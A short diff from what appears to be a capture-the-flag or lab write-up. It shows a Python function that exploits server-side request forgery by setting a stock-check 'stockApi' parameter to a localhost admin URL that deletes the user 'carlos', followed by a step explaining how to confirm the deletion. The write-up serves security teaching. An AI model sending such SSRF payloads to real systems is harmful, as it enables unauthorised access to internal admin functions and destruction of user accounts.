@@ -49,7 +49,7 @@ def main():
 def delete_user(url):
     payload = 'http://localhost/admin/delete?username=carlos' #since we have to delete the carlos username
     check_stock_path = '/product/stock' 
-    params = {'stockApi': payload} #which is in the response of the stock request
+    params = {'stockApi': payload} #which is in the stock request
     r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params)
 ```
 6. Now until above the if script executed, the user would have be deleted but what if we want to check if our script worked is correct or not, hence below code. Here we make an another request to the `/admin` path and in the response the script will check for keyword `User deleted successfully`, if mentioned then it is a success, if not - unsuccess. 
